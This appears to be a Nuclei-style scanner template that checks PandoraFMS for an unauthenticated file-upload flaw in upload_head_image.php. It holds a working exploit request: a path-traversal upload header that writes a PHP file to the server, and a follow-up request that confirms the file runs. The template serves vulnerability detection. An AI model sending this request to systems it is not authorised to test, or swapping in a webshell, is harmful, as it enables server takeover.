id: PandoraFMS-uploadheadimage-upload
info:
  name: Template Name
  author: wangzong
  severity: critical
  description: PandoraFMS upload_head_image.php 接口处存在未授权文件上传漏洞，攻击者可上传恶意木马获取服务器权限。
  reference:
    - http://kpanda.wiki/#/Vulnhub/P6-1PandoraFMS-%E7%9B%91%E6%8E%A7%E8%BD%AF%E4%BB%B6-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0?id=p6-1pandorafms-%e7%9b%91%e6%8e%a7%e8%bd%af%e4%bb%b6-%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0
  tags: tags
variables:
  filename: "{{rand_base(6)}}"  
http:
  - raw:
      - |-
        POST /pandora_console/enterprise/meta/general/upload_head_image.php?up=true HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Up-Filename: ../../../../../../../../../../var/www/html/pandora_console/extensions/{{filename}}.php
        Accept-Encoding: gzip
        Connection: close
        Content-Length: 32

        <?php echo(md5(1)); unlink(__FILE__); ?>
      - |
        GET /pandora_console/extensions/{{filename}}.php HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: word
        part: body
        words:
          - 'c4ca4238a0b923820dcc509a6f75849b'
